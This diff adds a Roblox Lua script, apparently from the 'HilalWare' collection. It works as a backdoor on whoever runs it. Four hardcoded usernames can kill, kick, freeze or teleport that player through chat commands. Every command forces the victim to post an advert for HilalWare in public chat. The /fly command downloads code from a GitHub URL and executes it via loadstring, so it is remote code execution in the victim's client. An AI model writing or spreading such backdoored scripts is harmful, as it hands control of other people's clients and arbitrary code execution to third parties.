@@ -1,0 +1,124 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Yetkililer
+local allowedUsers = {
+    ["q692q"] = true,
+    ["muhammet_bekir2004"] = true,
+    ["HilalWare_Lua"] = true,
+    ["Muhammet_bekir2003"] = true
+}
+
+local frozen = false
+
+-- Yönetici etiketi
+local function addAdminTag(player)
+    local function onCharacterAdded(character)
+        local head = character:WaitForChild("Head", 5)
+        if head then
+            local billboard = Instance.new("BillboardGui")
+            billboard.Size = UDim2.new(0, 200, 0, 50)
+            billboard.StudsOffset = Vector3.new(0, 2, 0)
+            billboard.Adornee = head
+            billboard.AlwaysOnTop = true
+            billboard.Parent = head
+
+            local textLabel = Instance.new("TextLabel")
+            textLabel.Size = UDim2.new(1, 0, 1, 0)
+            textLabel.BackgroundTransparency = 1
+            textLabel.Text = "Yönetici"
+            textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+            textLabel.TextStrokeTransparency = 0
+            textLabel.TextScaled = true
+            textLabel.Font = Enum.Font.GothamBold
+            textLabel.Parent = billboard
+        end
+    end
+
+    player.CharacterAdded:Connect(onCharacterAdded)
+    if player.Character then
+        onCharacterAdded(player.Character)
+    end
+end
+
+-- Karakterin tüm parçalarını dondur / çöz
+local function setAnchoredAllParts(char, anchored)
+    for _, part in ipairs(char:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.Anchored = anchored
+        end
+    end
+end
+
+-- Chat mesajı gönder
+local function sendHilalWareMessage()
+    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("By HilalWare.Lua New Scripts", "All")
+end
+
+-- Komutlar
+local function setupCommands(player)
+    player.Chatted:Connect(function(message)
+        message = string.lower(message)
+
+        -- Sadece adminler komut çalıştırabilir
+        if not allowedUsers[player.Name] then
+            return
+        end
+
+        if message == "/kill" then
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                LocalPlayer.Character.Humanoid.Health = 0
+                sendHilalWareMessage()
+            end
+
+        elseif message == "/kick" then
+            LocalPlayer:Kick("Yetkili tarafından oyundan atıldınız.")
+            sendHilalWareMessage()
+
+        elseif message == "/freeze" then
+            if LocalPlayer.Character then
+                frozen = true
+                setAnchoredAllParts(LocalPlayer.Character, true)
+                sendHilalWareMessage()
+            end
+
+        elseif message == "/unfreeze" then
+            if LocalPlayer.Character then
+                frozen = false
+                setAnchoredAllParts(LocalPlayer.Character, false)
+                sendHilalWareMessage()
+            end
+
+        elseif message == "/bring" then
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") 
+                and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+                sendHilalWareMessage()
+            end
+
+        elseif message == "/fly" then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/HilalWare-Official/HilalWare/refs/heads/main/fly"))()
+            sendHilalWareMessage()
+
+        elseif message == "/unfly" then
+            if _G.FlyFunction and typeof(_G.FlyFunction) == "function" then
+                _G.FlyFunction(false)
+                sendHilalWareMessage()
+            end
+        end
+    end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    if allowedUsers[player.Name] then
+        addAdminTag(player)
+        setupCommands(player)
+    end
+end)
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if allowedUsers[player.Name] then
+        addAdminTag(player)
+        setupCommands(player)
+    end
+end
